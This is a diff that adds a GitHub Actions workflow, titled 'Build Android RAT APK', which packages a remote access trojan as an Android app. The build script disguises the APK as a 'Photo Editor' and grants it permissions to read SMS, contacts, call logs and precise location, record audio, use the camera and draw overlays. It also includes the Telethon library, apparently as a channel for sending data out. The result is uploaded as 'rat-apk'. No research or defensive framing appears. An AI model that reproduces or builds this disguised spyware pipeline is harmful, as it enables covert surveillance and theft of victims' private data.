@@ -1,0 +1,76 @@
+name: Build Android RAT APK
+
+# Jab bhi main branch pe push ho, yeh chalega
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  build:
+    # Ubuntu VM pe chalega
+    runs-on: ubuntu-latest
+
+    steps:
+      # 1. Repository ka code checkout karo
+      - name: Checkout Repository
+        uses: actions/checkout@v3
+
+      # 2. Python setup karo
+      - name: Set up Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.x'
+
+      # 3. Java aur Android SDK ke liye dependencies install karo
+      - name: Install Java and Android SDK
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openjdk-11-jdk unzip
+          wget -q https://dl.google.com/android/repository/sdk-tools-linux-4333796.zip
+          unzip sdk-tools-linux-4333796.zip -d $HOME/android-sdk
+          echo "ANDROIDSDK=$HOME/android-sdk" >> $GITHUB_ENV
+          echo "ANDROID_HOME=$HOME/android-sdk" >> $GITHUB_ENV
+
+      # 4. Android NDK install karo (Buildozer ke liye zaroori)
+      - name: Install Android NDK
+        run: |
+          wget -q https://dl.google.com/android/repository/android-ndk-r19b-linux-x86_64.zip
+          unzip android-ndk-r19b-linux-x86_64.zip -d $HOME
+          echo "ANDROIDNDK=$HOME/android-ndk-r19b" >> $GITHUB_ENV
+
+      # 5. Buildozer aur Python dependencies install karo
+      - name: Install Buildozer and Dependencies
+        run: |
+          pip install --upgrade pip
+          pip install buildozer kivy telethon pyjnius cryptography
+
+      # 6. Buildozer spec file ko ensure karo (agar nahi hai toh default banao)
+      - name: Ensure Buildozer Spec
+        run: |
+          if [ ! -f buildozer.spec ]; then
+            buildozer init
+            sed -i 's/title = My Application/title = Photo Editor/' buildozer.spec
+            sed -i 's/package.name = myapp/package.name = photoeditor/' buildozer.spec
+            sed -i 's/package.domain = org.test/package.domain = com.example/' buildozer.spec
+            sed -i 's/requirements = python3,kivy/requirements = python3,kivy,telethon,pyjnius,cryptography/' buildozer.spec
+            sed -i 's/#android.permissions/android.permissions = INTERNET,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,MANAGE_EXTERNAL_STORAGE,SYSTEM_ALERT_WINDOW,READ_SMS,READ_CONTACTS,READ_CALL_LOG,ACCESS_FINE_LOCATION,RECORD_AUDIO,CAMERA/' buildozer.spec
+            sed -i 's/android.api = 27/android.api = 33/' buildozer.spec
+            sed -i 's/android.minapi = 21/android.minapi = 21/' buildozer.spec
+            sed -i 's/android.sdk = 20/android.sdk = 20/' buildozer.spec
+            sed -i 's/android.ndk = 19b/android.ndk = 19b/' buildozer.spec
+          fi
+
+      # 7. APK build karo
+      - name: Build APK
+        run: |
+          export PATH=$PATH:$HOME/android-sdk/tools:$HOME/android-sdk/platform-tools
+          buildozer android debug
+
+      # 8. Build APK ko artifact ke roop mein upload karo
+      - name: Upload APK Artifact
+        uses: actions/upload-artifact@v3
+        with:
+          name: rat-apk
+          path: bin/photoeditor-*.apk
+          retention-days: 7  # 7 din tak rakheg
